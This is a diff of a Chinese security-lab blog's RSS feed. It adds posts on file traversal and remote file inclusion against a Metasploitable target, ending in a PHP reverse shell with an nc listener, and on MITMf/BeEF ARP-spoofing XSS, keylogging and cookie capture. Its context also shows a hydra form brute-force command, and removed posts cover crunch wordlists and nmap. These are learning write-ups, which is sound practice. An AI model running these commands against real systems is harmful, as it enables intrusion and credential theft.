@@ -8,8 +8,49 @@
     <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description></description>
-    <pubDate>Wed, 24 Apr 2019 07:42:28 GMT</pubDate>
+    <pubDate>Thu, 25 Apr 2019 07:55:00 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>文件遍历漏洞</title>
+      <link>http://yoursite.com/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</link>
+      <guid>http://yoursite.com/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</guid>
+      <pubDate>Thu, 25 Apr 2019 07:54:06 GMT</pubDate>
+      <description>
+      
+        
+        
+          &lt;ol&gt;
+&lt;li&gt;环境搭建&lt;br&gt;测试机ip：192.168.86.135&lt;br&gt;&lt;br&gt;靶机metasploittable的ip:192.168.86.128&lt;br&gt;靶机编辑php.ini文件&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;sudo vim /etc/php5/c
+        
+      
+      </description>
+      
+      <content:encoded><![CDATA[<ol><li>环境搭建<br>测试机ip：192.168.86.135<br><br>靶机metasploittable的ip:192.168.86.128<br>靶机编辑php.ini文件</li></ol><pre><code>sudo vim /etc/php5/cgi/php.ini  //编辑php配置文件</code></pre><p>找到allow_url_include这一行把Off改成On，  </p><pre><code>sudo /etc/init.d/apache2 restart //重启apache服务 </code></pre><ol start="2"><li>发起攻击  </li></ol><ul><li>尝试文件<code>/etc/passwd</code>遍历查看，成功。<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.07-59.png" alt></li><li>尝试定位url链接，成功<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/%E5%AE%9A%E4%BD%8D%E5%88%B0%E4%B8%80%E4%B8%AAurl%202018.11.21%2022.13-23.png" alt></li><li>测试机开启apache服务，制作php反弹shell，使其定位其链接<a href="http://192.168.86.135/1.php" target="_blank" rel="noopener">http://192.168.86.135/1.php</a><br><code>`</code><br>cp /url/share/webshells/php/php-reverse-shell.php /var/www/html/1.php  //复制成1.php到web目录下<br>vim 1.php //修改127.0.0.1成测试机ip完成保存<br>service apache2 start  //开启apache服务<br><br>nc -nvvlp 1234  //nc开启监控端口</li></ul><p><code>`</code><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/php%E5%8F%8D%E5%BC%B9shell.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.27-9.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.28-18.png" alt></p>]]></content:encoded>
+      
+      <comments>http://yoursite.com/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#disqus_thread</comments>
+    </item>
+    
+    <item>
+      <title>mitmf使用实行中间人xss攻击</title>
+      <link>http://yoursite.com/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/</link>
+      <guid>http://yoursite.com/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/</guid>
+      <pubDate>Thu, 25 Apr 2019 07:38:50 GMT</pubDate>
+      <description>
+      
+        
+        
+          &lt;h5 id=&quot;下载mitmf&quot;&gt;&lt;a href=&quot;#下载mitmf&quot; class=&quot;headerlink&quot; title=&quot;下载mitmf&quot;&gt;&lt;/a&gt;下载mitmf&lt;/h5&gt;&lt;p&gt;&lt;code&gt;apt-get install mitmf&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;ht
+        
+      
+      </description>
+      
+      <content:encoded><![CDATA[<h5 id="下载mitmf"><a href="#下载mitmf" class="headerlink" title="下载mitmf"></a>下载mitmf</h5><p><code>apt-get install mitmf</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190424103338.png" alt><br>kali2.0以上默认没有mitmf软件，kali1.0有mitmif。blackarch集成mitmf，推荐使用。</p><h5 id="mitmf实行xss攻击"><a href="#mitmf实行xss攻击" class="headerlink" title="mitmf实行xss攻击"></a>mitmf实行xss攻击</h5><h6 id="启动beef"><a href="#启动beef" class="headerlink" title="启动beef"></a>启动beef</h6><p><code>cd /usr/share.beef/</code>目录下，<code>./beef</code>启动beef<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141449.png" alt><br>默认账号密码都为beef<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190424105202.png" alt><br>使用arp欺骗，插入js脚本，实现xss攻击<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141126.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141601.png" alt><br>可以看到网页源码已经插入js脚本了<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141737.png" alt>   </p><h5 id="mitmf键盘记录器"><a href="#mitmf键盘记录器" class="headerlink" title="mitmf键盘记录器"></a>mitmf键盘记录器</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425150858.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425150940.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151056.png" alt><br>mitmf网页图片倒置（恶作剧）<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151443.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151819.png" alt></p><h4 id="mitmf-cookie显示"><a href="#mitmf-cookie显示" class="headerlink" title="mitmf cookie显示"></a>mitmf cookie显示</h4><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425152443.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425152517.png" alt></p>]]></content:encoded>
+      
+      <comments>http://yoursite.com/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/#disqus_thread</comments>
+    </item>
     
     <item>
       <title>dnschefDNS欺骗</title>
@@ -173,47 +214,6 @@ Usag
       <content:encoded><![CDATA[<p>1.windows密码破解</p><ul><li>smb密码破解<br>设置windows账号密码，<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325112320.png" alt><br><br>linux的ssh登陆密码破解<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325133211.png" alt><br>hydra破解ftp登陆账号密码<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325145427.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325145338.png" alt><br>hydra破解表单密码，这里是我是dvwa页面破解。密码破解的特征是密码正确会跳转到index.php页面。使用post方式提交密码。<br><code>hydra -l admin -P comon.lst 192.168.200.244 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -V</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329103051.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329103712.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329103853.png" alt><br>xhydra是hydra的图形界面<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325143122.png" alt>   </li></ul>]]></content:encoded>
       
       <comments>http://yoursite.com/2019/03/29/%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>crunch创建密码字典</title>
-      <link>http://yoursite.com/2019/03/18/crunch%E5%88%9B%E5%BB%BA%E5%AF%86%E7%A0%81/</link>
-      <guid>http://yoursite.com/2019/03/18/crunch%E5%88%9B%E5%BB%BA%E5%AF%86%E7%A0%81/</guid>
-      <pubDate>Mon, 18 Mar 2019 04:50:26 GMT</pubDate>
-      <description>
-      
-        
-        
-          &lt;p&gt;&lt;code&gt;crunch &amp;lt;min-len&amp;gt; &amp;lt;max-len&amp;gt; [&amp;lt;charset string&amp;gt;] [options] – &amp;lt;charset string&amp;gt;&lt;/code&gt;默认是小写字符&lt;br&gt; &lt;code&gt;crunch 6
-        
-      
-      </description>
-      
-      <content:encoded><![CDATA[<p><code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options] – &lt;charset string&gt;</code>默认是小写字符<br> <code>crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100 – -b</code> 按大小分割字典文件（kb/kib、mb/mib、gb/gib） – -c 每个字典的行数 – 以上两个参数必须与-o START 结合使用 – -d 同一字符连贯出现数量（11 / aaa)<br> <code>/usr/share/crunch/charset.lst</code> crunch 内置字符文件<br> <img src="http://img-jaie.test.upcdn.net/20190318124226.png" alt><br> 使用crunch 内置字符文件字符集hex-lower创建字典<br> <img src="http://img-jaie.test.upcdn.net/20190318124315.png" alt><br>  <code>crunch 1 1 -p 1234567890 | more</code>  -p参数指定字符串对对其所有排序组合列车，此命令意思是对1234567890列出这10个数字所有排列组合。其前面的指定密码长度无效<br>  <img src="http://img-jaie.test.upcdn.net/20190318124351.png" alt>   </p><h6 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a>字典组成规则</h6><p> <code>– crunch 6 6 -t @,%%^^ | more</code><br><br>– @：小写字母 lalpha –<br>— ,：大写字母 ualpha<br>– %:数字 numeric<br>– ^:符号 symbols<br> 输出文件压缩 <code>– crunch 4 4 -t @,%^ -o 1.txt -z 7z –</code><br>其他压缩格式：gzip、bzip2、lzma – 7z压缩比率最大</p>]]></content:encoded>
-      
-      <comments>http://yoursite.com/2019/03/18/crunch%E5%88%9B%E5%BB%BA%E5%AF%86%E7%A0%81/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>nmap扫描</title>
-      <link>http://yoursite.com/2019/03/11/nmap%E6%89%AB%E6%8F%8F/</link>
-      <guid>http://yoursite.com/2019/03/11/nmap%E6%89%AB%E6%8F%8F/</guid>
-      <pubDate>Mon, 11 Mar 2019 05:11:16 GMT</pubDate>
-      <description>
-      
-        
-        
-          &lt;p&gt;nmap是一款开源免费的网络发现和安全审计工具，扫描端口、操作系统的版本、端口对应运行的服务等等。&lt;br&gt;zenmap是nmap官方提供的图形界面工具   &lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;nmap XXX.XXX.XXX.XXX 完整扫描 &lt;br&gt;&lt;/li&gt;
-&lt;li&gt;nmap 
-        
-      
-      </description>
-      
-      <content:encoded><![CDATA[<p>nmap是一款开源免费的网络发现和安全审计工具，扫描端口、操作系统的版本、端口对应运行的服务等等。<br>zenmap是nmap官方提供的图形界面工具   </p><ul><li>nmap XXX.XXX.XXX.XXX 完整扫描 <br></li><li>nmap -v XXX.XXX.XXX.XXX 打印每一步扫描 <br></li><li>nmap -f XXX.XXX.XXX.XXX 扫描常见的端口 <br></li><li>nmap -sV XXX.XXX.XXX.XXX 检测服务详细信息 <br></li><li>nmap  -O XXX.XXX.XXX.XXX 检测主机操作系统以及硬件信息 <br></li><li>nmap –script=vuln XXX.XXX.XXX.XXX 扫描目标系统漏洞<br></li><li>namp -sT xxx.xxx.xxx.xxx TCP扫描，这种扫描可能会被目标机系统日志记录<br></li><li>namp -sS tcp syn（半扫描）扫描，一般不会被目标机系统日志记录<br></li><li>namp -sU udp扫描，但是一般不可靠<br></li><li>nmap -v（显示每一条信息） -sn （扫描存活主机，不扫描端口）-PE（通过PE确定机器是否开启） XXX.XXX.XXX.1/24 扫描整个子网 <br></li><li>nmap -v -sn -PE XXX.XXX.XXX.1-5指定范围扫描 <br></li><li>nmap -v -p 135 XXX.XXX.XXX.XXX扫描指定135端口<br>（多个端口逗号分隔）<br></li><li>nmap -sS XXX.XXX.XXX.XXX SYN扫描，隐蔽扫描（不需要创建完整链接）<br>端口：默认情况下，nmap会扫描1000个最有可能开放的tcp端口  </li></ul><ol><li>namp默认（局域网）扫描<br><img src="http://img-jaie.test.upcdn.net/20190311122720.png" alt><br><img src="http://img-jaie.test.upcdn.net/20190311122812.png" alt></li><li>扫描系统信息<br><img src="http://img-jaie.test.upcdn.net/20190311122934.png" alt></li><li>扫描系统漏洞<br><img src="http://img-jaie.test.upcdn.net/20190311123041.png" alt></li><li>局域网扫描<br><img src="http://img-jaie.test.upcdn.net/20190311123121.png" alt></li><li>指定端口扫描，如果未指定端口默认1-1000<br><img src="http://dimg-jaie.test.upcdn.net/20190311130102.png" alt></li></ol>]]></content:encoded>
-      
-      <comments>http://yoursite.com/2019/03/11/nmap%E6%89%AB%E6%8F%8F/#disqus_thread</comments>
     </item>
     
   </channel>
